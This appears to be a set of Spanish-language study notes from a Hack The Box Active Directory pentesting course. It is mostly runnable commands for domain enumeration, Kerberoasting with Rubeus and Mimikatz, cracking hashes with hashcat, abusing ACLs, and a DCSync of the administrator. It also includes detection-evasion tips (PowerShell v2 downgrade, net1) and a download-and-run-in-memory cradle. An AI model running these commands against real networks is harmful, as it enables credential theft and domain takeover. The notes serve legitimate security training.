# Reconocimiento
```
ipconfig /all             # Interfaces de Red

arp -a                    # Arp tables

route print
```

## Enumerando protecciones
```
Get-MpComputerStatus             # Windwos Defender

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections # Lista de aplicaciones bloqueadas por Applocker

Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

ConstrainedLanguage

Find-LAPSDelegatedGroups

Find-AdmPwdExtendedRights

Get-LAPSComputers
```

Herramientas usadas en este trozo: (Si las tenemos no añadir)

```
smbmap

psexec.py (IMPACKET)

wmiexec.py (IMPACKET)

windapsearch.py 

bloodhound
```

# Enumeracion desde windows
```
Get-Module # Para ver los modulos que tenemos

Import-Module [NOMBRE_DEL_MODULO] # Para instalar un modulo

Import-Module ActiveDirectory # El que más vamos a usar

Get-ADDomain # Info general del dominio

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName # Para obtener un usuario del AD

Get-ADTrust # Para las relaciones de confianza

Get-ADTrust -Filter *

Get-ADGroup -Filter * | select name

Get-ADGroup -Identity "Backup Operators"

Get-ADGroupMember -Identity "Backup Operators"
```

## PowerView
|**Dominio**|**Descripción**|
|---|---|
|`Export-PowerViewCSV`|Agregar los resultados a un archivo CSV|
|`ConvertTo-SID`|Convierte el nombre de un usuario o grupo a su valor SID.|
|`Get-DomainSPNTicket`|Solicita el ticket Kerberos para una cuenta de nombre principal de servicio (SPN) específica.|
|**Funciones de dominio/LDAP:**||
|`Get-Domain`|Devolverá el objeto AD para el dominio actual (o especificado).|
|`Get-DomainController`|Devuelve una lista de los controladores de dominio para el dominio especificado.|
|`Get-DomainUser`|Devolverá todos los usuarios u objetos de usuario específicos en Active Directory.|
|`Get-DomainComputer`|Devolverá todos los equipos u objetos de equipo específicos en Active Directory.|
|`Get-DomainGroup`|Devolverá todos los grupos u objetos de grupo específicos en Active Directory.|
|`Get-DomainOU`|Busque todos los objetos de OU o objetos específicos de OU en Active Directory.|
|`Find-InterestingDomainAcl`|Busca ACL de objetos en el dominio con derechos de modificación establecidos para objetos no integrados.|
|`Get-DomainGroupMember`|Devolverá los miembros de un grupo de dominio específico.|
|`Get-DomainFileServer`|Devuelve una lista de servidores que probablemente funcionan como servidores de archivos.|
|`Get-DomainDFSShare`|Devuelve una lista de todos los sistemas de archivos distribuidos para el dominio actual (o especificado).|
|**Funciones de GPO:**||
|`Get-DomainGPO`|Devolverá todas las GPO o objetos GPO específicos en Active Directory.|
|`Get-DomainPolicy`|Devuelve la directiva de dominio predeterminada o la directiva del controlador de dominio para el dominio actual.|
|**Funciones de enumeración de computadora:**||
|`Get-NetLocalGroup`|Enumera los grupos locales en una máquina local o remota.|
|`Get-NetLocalGroupMember`|Enumera a los miembros de un grupo local específico.|
|`Get-NetShare`|Devuelve las acciones abiertas en la máquina local (o remota).|
|`Get-NetSession`|Devolverá información de sesión para la máquina local (o remota).|
|`Test-AdminAccess`|Comprueba si el usuario actual tiene acceso administrativo a la máquina local (o remota).|
|**Funciones 'Meta' encadenadas:**||
|`Find-DomainUserLocation`|Encuentra máquinas donde usuarios específicos han iniciado sesión.|
|`Find-DomainShare`|Encuentra recursos compartidos accesibles en las máquinas del dominio.|
|`Find-InterestingDomainShareFile`|Búsquedas de archivos que coincidan con criterios específicos en recursos compartidos legibles en el dominio.|
|`Find-LocalAdminAccess`|Localiza las máquinas del dominio local donde el usuario actual tenga acceso de administrador local.|
|**Funciones de confianza del dominio:**||
|`Get-DomainTrust`|Devuelve las relaciones de confianza del dominio actual o de un dominio especificado.|
|`Get-ForestTrust`|Devuelve todos los fideicomisos forestales para el bosque actual o un bosque específico.|
|`Get-DomainForeignUser`|Enumera los usuarios que están en grupos fuera del dominio del usuario.|
|`Get-DomainForeignGroupMember`|Enumera los grupos con usuarios fuera del dominio del grupo y devuelve cada miembro externo.|
|`Get-DomainTrustMapping`|Enumerará todas las relaciones de confianza para el dominio actual y cualquier otra que se detecte.|

Esta tabla no abarca todas las funciones que ofrece PowerView, pero incluye muchas de las que utilizaremos con frecuencia. A continuación, experimentaremos con algunas de ellas.

```
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

Get-DomainGroupMember -Identity "Domain Admins" -Recurse

Get-DomainTrustMapping

Test-AdminAccess -ComputerName ACADEMY-EA-MS01

Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

## SharpView
Alternativa a PowerView apra .NET
```
.\SharpView.exe Get-DomainUser -Help

.\SharpView.exe Get-DomainUser -Identity forend
```

## Snaffler
Una herramienta que nos ayuda a obtener credenciales u otros datos confidenciales en un entorno de Active Directory.
```
Snaffler.exe -s -d [DOMINIO.LOCAL] -o snaffler.log -v data
```
-o para guardar en un archivo `data` para revisar mejor en pantalla, mas visual. De todas formas el comando que más vamos a usar es el siguiente:
```
.\Snaffler.exe -d [DOMINIO.LOCAL] -s -v data
```

Muy buena herramienta!!
## SharpHound
Alternativa a Bloodhound pero dentro de windows:
```
.\SharpHound.exe -c All --zipfilename [NOMBRE]
```

# Living Of The Land
## Comandos para la enumeracion sin saltar alarmas, solo cosas nativas

| **Command**                                             | **Result**                                                                                 |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `hostname`                                              | Prints the PC's Name                                                                       |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
| Systeminfo                                              | summary of the host's information for us in one tidy output                                |

### con powershell

| **Cmd-Let**                                                                                                                               | **Description**                                                                                                                                                                                                                               |
| ----------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                                              | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                               | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                               | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                                      | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell \PSReadline\ConsoleHost_history.txt` (Esto va junto pero si lo pones se descuadra) | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`                | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |
|                                                                                                                                           |                                                                                                                                                                                                                                               |
## Downgrading Powershell
Para poder downgradearla que a veces de esta manera podemos saltarnos restricciones por que  a veces se olvidan de ver otras versiones de powershell. Tambien pasa que en los logs que encontramos en el registro de eventos de Powershell / Applications and Services Logs > Microsoft > Windows > PowerShell > Operational / Applications and Services Logs > Microsoft > Windows > PowerShell > Operational pues no suelen dejar rastro
```
Get-host # Para ver la actual

powershell.exe -version 2

Get-host # Para ver el cambio

get-module
```
Podemos verificarlo como nos muestran en HTB que desde el registro de eventos el cual nos mostrara los comandos de la powershell antes de hacer el downgrade y así pudiendo usar powershell con una versión vieja sin ser detectado. Todo esto se deve a que las versiones anteriores a PowerShell 3.0 no registra nada.

## Comprobación de cortafuegos
```
netsh advfirewall show allprofiles

sc query windefend

Get-MpComputerStatus
```

## Comprobar la sesión
La cosa cuando vulneramos  una cuenta es que entremos a un servidor, pero si otro usuario tiene una sesión iniciada o ese mismo con el que estamos y ve cosas sospechosas puede avisar al administrador de cosas raras y que investiguen o que directamente cambien la contraseña. Para ello podremos verlo con:
```
qwinsta
```

## Información de red
| **Comandos de red**                  | **Descripción**                                                                                                                     |
| ------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Muestra todos los hosts conocidos almacenados en la tabla arp.                                                                      |
| `ipconfig /all`                      | Muestra la configuración del adaptador para el host. A partir de aquí podemos determinar el segmento de red.                        |
| `route print`                        | Muestra la tabla de enrutamiento (IPv4 e IPv6) que identifica las redes conocidas y las rutas de capa tres compartidas con el host. |
| `netsh advfirewall show allprofiles` | Muestra el estado del firewall del host. Podemos determinar si está activo y filtrando el tráfico.                                  |

## Windows Management Instrumentation (WMI)
| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |
| wmic ntdomain get                                                                    |                                                                                                        |

 ## Comandos de red
| **Dominio**                                     | **Descripción**                                                                                                                                     |
| ----------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Información sobre los requisitos de contraseña                                                                                                      |
| `net accounts /domain`                          | Política de contraseñas y bloqueo                                                                                                                   |
| `net group /domain`                             | Información sobre grupos de dominio                                                                                                                 |
| `net group "Domain Admins" /domain`             | Lista de usuarios con privilegios de administrador de dominio                                                                                       |
| `net group "domain computers" /domain`          | Lista de PCs conectados al dominio                                                                                                                  |
| `net group "Domain Controllers" /domain`        | Listado de cuentas de PC de los controladores de dominio                                                                                            |
| `net group <domain_group_name> /domain`         | Usuario que pertenece al grupo                                                                                                                      |
| `net groups /domain`                            | Lista de grupos de dominio                                                                                                                          |
| `net localgroup`                                | Todos los grupos disponibles                                                                                                                        |
| `net localgroup administrators /domain`         | Lista los usuarios que pertenecen al grupo de administradores dentro del dominio (el grupo `Domain Admins`se incluye aquí de forma predeterminada). |
| `net localgroup Administrators`                 | Información sobre un grupo (administradores)                                                                                                        |
| `net localgroup administrators [username] /add` | Agregar usuario a administradores                                                                                                                   |
| `net share`                                     | Consultar las acciones actuales                                                                                                                     |
| `net user <ACCOUNT_NAME> /domain`               | Obtenga información sobre un usuario dentro del dominio.                                                                                            |
| `net user /domain`                              | Lista todos los usuarios del dominio                                                                                                                |
| net user /domain wrouse                         |                                                                                                                                                     |
| `net user %username%`                           | Información sobre el usuario actual                                                                                                                 |
| `net use x: \computer\share`                    |                                                                                                                                                     |
| `net view`                                      | Obtén una lista de ordenadores                                                                                                                      |
| `net view /all /domain[:domainname]`            | Acciones en los dominios                                                                                                                            |
| `net view \computer /ALL`                       | Enumerar las acciones de un ordenador                                                                                                               |
| `net view /domain`                              | Lista de PC del dominio                                                                                                                             |
>[!Note]
>Si crees que el SOC o algun Blue Teamer está detras de estos logs que podemos crear al usar `net` podemos probar a ejecutar `net1` que ejecutará lo mismo pero sin hacer ruido

## Dsquery
Es una útil herramienta de línea de comandos que se puede utilizar para encontrar objetos de Active Directory.
Para esto necesitaremos permisos de admin o una powershell con system
```
dsquery user

dsquery computer

dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL" # Búsqueda comodín

dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl # Usuarios con atributos específicos configurados (PASSWD_NOTREQD)

dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName # Controladores de dominio

dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr sAMAccountName description
```

### **Filtrado LDAP y UAC en Active Directory**

Sirve para hacer búsquedas avanzadas de objetos (usuarios, grupos) usando tres elementos:

1. **Atributo UAC (`userAccountControl`):** Define qué configuración de la cuenta estamos buscando (ej. si está bloqueada o no expira la contraseña).
    
2. **Códigos OID (Reglas de coincidencia):**
    
    - **`...803`**: Coincidencia **exacta** del bit.
        
    - **`...804`**: Coincidencia **parcial** (si cumple alguno de los bits).
        
    - **`...1941`**: Búsqueda **recursiva** (ej. usuarios dentro de grupos anidados).
        
3. **Operadores Lógicos:** Se colocan **al principio** de la consulta para combinar filtros:
    
    - **`&` (AND)**: Cumple _todas_ las condiciones.
        
    - **`|` (OR)**: Cumple _al menos una_ condición.
        
    - **`!` (NOT)**: Excluye esa condición.

# Kerberoasting

## Desde Linux
Depende del punto en el que estemos se puede hacer de varias formas:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

### Ataque
#### Instalación
En el modulo de impacket va todo
#### Listado de cuentas
```
impacket-GetNPUsers -dc-ip [IP_DC] [DOMAIN.LOCAL]/forend
```

#### Solicitando todas las entradas de TGS
 ```
impacket-GetNPUsers -dc-ip [IP_DC] [DOMAIN.LOCAL]/forend -request
 ```

#### De un solo usuario
```
impacket-GetNPUsers -dc-ip [IP_DC] [DOMAIN.LOCAL]/forend -request-user [USER]
```

#### A un output
```
impacket-GetNPUsers -dc-ip [IP_DC] [DOMAIN.LOCAL]/forend -request-user [USER] -outputfile [NOMBBRE_ARCHIVO]
```
>[!Note]
>El modo de hashcat para romper esto es el 13100


## Desde Windows 
### Manual
Primero vemos si hay algún SPN, nos centraremos en las cuentas de usuarios las cuentas de equipo las ignoraremos
```PowerShell
setspn.exe -Q */*
```

Después con una powershell solicitamos los tickets TGS y cargarlos en memoria para la terminal anterior:
```PowerShell
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

También podemos hacerlo todo de golpe pero al extraer todo de golpe no es optimo:
``` PowerShell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Una vez cargados en memoria podremos extraerlos usando Mimikatz:
```
mimikatz # base64 /out:true

mimikatz # kerberos::list /export
```
Al poner base64 nos lo muestra por consola en base64, si no hubiéramos puesto esto Mimikatz nos lo hubiera guardado en un archivo.kirbi.

Para descifrar este base64:
```
echo "<base64 blob>" | tr -d \\n

cat encoded_file | base64 -d > [ARCHIVO].kirbi
```

Y podremos intentar crackearlo:
```
kirbi2john [ARCHIVO].kirbi

sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > [HASH]

hashcat -m 13100
```

### Con herramientas automatizadas
```PowerShell
Import-Module .\PowerView.ps1

Get-DomainUser * -spn | select samaccountname

Get-DomainUser -Identity [USUARIO] | Get-DomainSPNTicket -Format Hashcat

Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\[ARCHIVO].csv -NoTypeInformation
```
Una vez tengamos el .csv usaremos rubeus

```PowerShell
.\Rubeus.exe

.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
Con esto podremos ver cuales son administradores

#### Ataque
```
.\Rubeus.exe kerberoast /user:[USUARIO] /nowrap
```
Esto nos dará el hash RC4 en este caso

```
Get-DomainUser [USUARIO] -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
Con este podemos ver el atrubuto de `msDS-SupportedEncryptionTypes`, en el caso de HTB es 0 por lo que significa que no se ha establecido y por defecto el valor es `RC4_HMAC_MD5`

Vamos a descifrar con hashcat:
```
hashcat -m 13100 [rc4_to_crack]
```

Otro ejemplo mostrado en HTB es que `msDS-SupportedEncryptionTypes` esta con el valor 24, por lo que esta con AES 128/256, por lo que se crackeará con:
```
hashcat -m 19700 [aes_to_crack]
```
Este el tiempo de descifrado es muchísimo mayor al de rc4

Un truco para intentar forzar  el hash rc4 es usar rubeus con la flag `/tgtdeleg`:
```
.\Rubeus.exe kerberoast /tgtdeleg /user:[USUARIO] /nowrap
```
# ACLs

## Información 
Buscamos atacar estos permisos para: Movimiento lateral, escalado de privilegios o persistencia

Hay dos grupos de ACLs:
1. DACL.
Es la que **decide quién entra**. Contiene las reglas (ACE) que permiten o deniegan el acceso a un objeto.

2. SACL
Es la que **vigila y registra**. No da ni quita permisos, sino que sirve para que los administradores guarden un historial (logs) de quién ha intentado acceder a ese objeto.

Tipos de ACLs:
- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `AddSelf` abused with `Add-DomainGroupMember`

En HTB se ven:
1. `ForceChangePassword`
Nos da derecho a restablecer la contraseña de un usuario sin conocerla previamente (debe usarse con precaución y, por lo general, es mejor consultar con nuestro cliente antes de restablecer las contraseñas).

2. `GenericWrite`
Nos otorga el derecho de escribir en cualquier atributo no protegido de un objeto. Si tenemos este acceso sobre un usuario, podríamos asignarle un SPN y realizar un ataque Kerberoasting (que se basa en que la cuenta objetivo tenga una contraseña débil). Sobre un grupo, podríamos agregarnos a nosotros mismos u otra entidad de seguridad a un grupo determinado. Finalmente, si tenemos este acceso sobre un objeto de equipo, podríamos realizar un ataque de delegación restringida basado en recursos, lo cual está fuera del alcance de este módulo.

3. `AddSelf`
Muestra los grupos de seguridad a los que un usuario puede añadirse a sí mismo.

4. `GenericAll`
Esto nos otorga control total sobre un objeto objetivo. Dependiendo de si se concede sobre un usuario o grupo, podríamos modificar la pertenencia a grupos, forzar un cambio de contraseña o realizar un ataque Kerberoasting dirigido. Si tenemos este acceso sobre un objeto de equipo y se utiliza la Solución de Contraseña de Administrador Local (LAPS) en el entorno, podemos leer la contraseña de LAPS y obtener acceso de administrador local a la máquina, lo que podría facilitarnos el movimiento lateral o la escalada de privilegios en el dominio si logramos obtener controles privilegiados o algún tipo de acceso privilegiado.

La siguiente foto es un perfecto esquema para ver permisos, ataques, herramientas usadas y desde que SO para explotarlos todos y cada uno de ellos:
![[ACL_attacks_graphic.png]]

## Enumeración de ACLs
### Manual
#### Manual (Posibilidad de importar)
```PowerShell
Find-InterestingDomainAcl
```
Con este comando mostraremos TODAS las ACLs pero esto es demasiada fumada, vamos a simplificar las cosas por ejemplo usando PowerView:

```PowerShell
Import-Module .\PowerView.ps1

$sid = Convert-NameToSid [USUARIO]
```

Y ya podremos usar Ger-DomainObjectACL:
```PowerShell
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

En el caso de HTB nos sale `00299570-246d-11d0-a768-00aa006e0529` en el `ObectAceType`, el cual podremos revisar en [esta página](https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) y ver que son los permisos `ForceChangePassword`. O podemos asignarle el valor y buscarlo con:
```
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

También podremos verlo directamente con el modulo de PowerView de `ResolveGUIDs`:
```
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Es importante tener varias formas ya que alguna puede estar bloqueada en el momento de usarlas.

#### Manual (Sin posibilidad de importar)
Esto sería de forma manual usando nuestras herramientas importadas o teniendo la posibilidad de ello, pero si no tuviéramos esta posibilidad podríamos hacerlo a más bajo nivel con cmdlets como:
[Get-Acl](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2) y [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps)

Para ello, vamos primero a sacar la lista de usuarios:
```PowerShell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

Luego podremos usar un blucle para ir sacando los permisos a cada usuario:
``` PowerShell
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\[USUARIO]'}}
```
Destacar que en el final del comando podemos especificar el usuario para coger los de el específicamente.

Para poderlo ver mas claramente:
```PowerShell
$sid2 = Convert-NameToSid damundsen

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

En el ejemplo de HTB nos muestra que tiene permisos `GenericWrite` sobre el grupo `Help Desk Level 1`, por lo que se puede buscar mas info con:
``` PowerShell
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

Con esto se ve que el grupo esta anidado dentro del CN `Information Technology` por lo que investiga también ese grupo:
```PowerShell
$itgroupsid = Convert-NameToSid "Information Technology"

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

Este tiene permisos GenericAll cobre `Angela Dunn` es decir `adunn`
```PowerShell
$adunnsid = Convert-NameToSid adunn

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```

### Automático (BloodHound)
Esto podremos verlo y linkearlo a Bloodhound

```
bloodhound-python -u 'USUARIO' -p 'CONTRASEÑA' -d 'DOMINIO.LOCAL' -c All -v --zip

O con sharphound

.\SharpHound.exe -c All --zipfilename [ARCHIVO].zip
```

Por si alguna pregunta necesitas el tipo de ACL y se hace directo desde bloodhound la tradución es:

|**Flecha en BloodHound**|**ActiveDirectoryRights / ObjectAceType en Windows**|**¿Qué significa en el mundo real?**|
|---|---|---|
|**`AddSelf`**|`Self` / `Self-Membership`|Puedes agregarte **a ti mismo** a ese grupo objetivo.|
|**`AddMember`**|`WriteProperty` / `Member`|Tienes permiso para agregar a **cualquier usuario** a ese grupo.|
|**`GenericWrite`**|`WriteProperty` / `All`|Puedes modificar **cualquier atributo** del objeto (como cambiar el script de inicio de un usuario).|
|**`WriteDacl`**|`WriteDacl`|Puedes cambiar los permisos (la DACL) del objeto para darte control total (`GenericAll`).|
|**`WriteOwner`**|`WriteOwner`|Puedes adueñarte del objeto y, al ser el dueño, cambiar las DACL a tu antojo.|
|**`GenericAll`**|`FullControl`|Tienes **control absoluto** sobre el objeto. Puedes hacer lo que te dé la gana con él.|
|**`ForceChangePassword`**|`ExtendedRight` / `User-Force-Change-Password`|Puedes resetear la contraseña del usuario sin saber la contraseña actual.|
|**`AllExtendedRights`**|`ExtendedRight` / `All`|Tienes todos los derechos extendidos (incluye reseteo de contraseñas, lecturas especiales, etc.).|
|**`ReadLAPSPassword`**|`ExtendedRight` / `ms-Mcs-AdmPwd`|Puedes leer la contraseña de Administrador local gestionada por LAPS en ese ordenador.|
|**`DCSync`**|`ExtendedRight` / `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`|Tienes permiso para simular ser un Controlador de Dominio y pedir los hashes de contraseñas de todos (¡Jaque Mate al dominio!).|

## Abusing ACLs
Básicamente en el ejemplo de HTB sigue la ruta de 'Windows Abuse' de BloodHound, el de `ForceChangePassword` y el de `GenericWrite`, de todas formas vamos a verlo:
```PowerShell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

Import-Module .\PowerView.ps1

Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

```PowerShell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName #Confirmamos con esto
```

Y ya podremos hacer el kerberoasting de adunn:
```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

```PowerShell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```
Esto se hace por que podríamos cambiar otra vez la pass del administrador como hemos hecho antes ya que lo añadimos al grupo que puede, peeero esto saltaria las alarmas o a veces puedes estar bloqueado por lo que se usa kerberos para seguir. Esto es posible por que le hacemos un SPN falso y esto le dice al AD que ahora tambien tiene una web/servicio por lo que se le puede sacar el TGS con rubeus. Posteriormente con el `-m 13100` de hashcatr se rompería. 
### Para la limpieza
```PowerShell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose # Para eliminar el SPN falso

Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose # Para eliminarlo del grupo

Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose # Confirmamos que fue eliminado

```
## DCSync
Siguiendo en el escenario anterior de HTB vemos que el usuario adunn tiene privilegios DCSync en el dominio. Vamos a explotarlo:
```
mimikatz # privilege::debug

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
ACTUALIZAR ESTO EN LA SELECCION DE MIMIKATZ!

tambien se usa:

Para buscar permisos 'ENCRYPTED_TEXT_PWD_ALLOWED'
```
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol 
```

